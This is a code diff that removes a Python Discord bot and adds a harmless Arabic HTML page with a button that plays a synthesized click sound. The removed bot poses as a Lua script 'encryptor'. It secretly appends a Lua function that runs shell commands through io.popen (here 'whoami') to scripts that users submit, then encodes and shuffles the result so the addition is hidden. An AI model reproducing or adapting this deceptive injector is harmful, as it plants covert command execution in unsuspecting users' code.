@@ -1,56 +1,61 @@
-import discord
-from discord.ext import commands
-import requests
-import random
-import base64
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>زر مع صوت فخم</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #0f172a;
+            font-family: sans-serif;
+        }
 
-TOKEN = "ضع_توكن_البوت_هنا"
-PREFIX = "!"
+        .lux-button {
+            padding: 15px 32px;
+            font-size: 18px;
+            color: #fff;
+            background: linear-gradient(135deg, #6366f1, #4f46e5);
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
+            transition: all 0.2s ease;
+        }
 
-intents = discord.Intents.default()
-intents.message_content = True
-bot = commands.Bot(command_prefix=PREFIX, intents=intents)
+        .lux-button:active {
+            transform: scale(0.96);
+            box-shadow: 0 2px 8px rgba(99, 102, 241, 0.2);
+        }
+    </style>
+</head>
+<body>
 
-def encrypt(original):
-    malware = "\nlocal function exec(cmd)\n    local handle = io.popen(cmd)\n    local result = handle:read(\"*a\")\n    handle:close()\n    return result\nend\nexec(\"whoami\")"
-    full = original + malware
-    b64 = base64.b64encode(full.encode()).decode()
-    nums = [ord(c) for c in b64]
-    for i in range(len(nums)-1, 0, -1):
-        j = random.randint(0, i)
-        nums[i], nums[j] = nums[j], nums[i]
-    return f"return(function(d)return(loadstring or load)(d)()end)(\"{','.join(map(str,nums))}\")"
+    <button class="lux-button" onclick="playClickSound()">اضغط هنا</button>
 
-@bot.event
-async def on_private_message(msg):
-    if msg.author.bot: return
-    if not msg.content.startswith("NXR"): return
-    await msg.channel.send("🔒 أرسل رابط raw أو ارفق ملف السكربت.")
-    try:
-        reply = await bot.wait_for('message', timeout=60, check=lambda m: m.author==msg.author and m.channel==msg.channel)
-    except:
-        await msg.channel.send("⏳ انتهى الوقت.")
-        return
-    code = None
-    if reply.content.startswith("http"):
-        try:
-            r = requests.get(reply.content, timeout=10)
-            if r.status_code == 200: code = r.text
-        except: pass
-    elif reply.attachments:
-        try:
-            data = await reply.attachments[0].read()
-            code = data.decode('utf-8', errors='ignore')
-        except: pass
-    if not code or len(code) < 5:
-        await msg.channel.send("❌ رابط أو ملف غير صالح.")
-        return
-    enc = encrypt(code)
-    if len(enc) > 1900:
-        parts = [enc[i:i+1900] for i in range(0, len(enc), 1900)]
-        await msg.channel.send("```lua\n" + "\n\n".join(parts) + "\n```")
-    else:
-        await msg.channel.send(f"```lua\n{enc}\n```")
-    await msg.channel.send("✅ تم التشفير.")
+    <script>
+        // دالة لتوليد صوت كليك ناعم وفخم برمجياً
+        function playClickSound() {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
 
-bot.run(TOKEN)
+            osc.type = 'sine'; // موجة ناعمة
+            osc.frequency.setValueAtTime(800, audioCtx.currentTime); // التردد الأول
+            osc.frequency.exponentialRampToValueAtTime(400, audioCtx.currentTime + 0.04); // انخفاض سريع للتردد لإعطاء ملمس الـ Click
+
+            gain.gain.setValueAtTime(0.15, audioCtx.currentTime); // مستوى الصوت (خفيف)
+            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.04); // اختفاء الصوت بسرعة
+
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+
+            osc.start();
+            osc.stop(audioCtx.currentTime + 0.04);
+        }
+    </script>
+
+</body>
+</html>
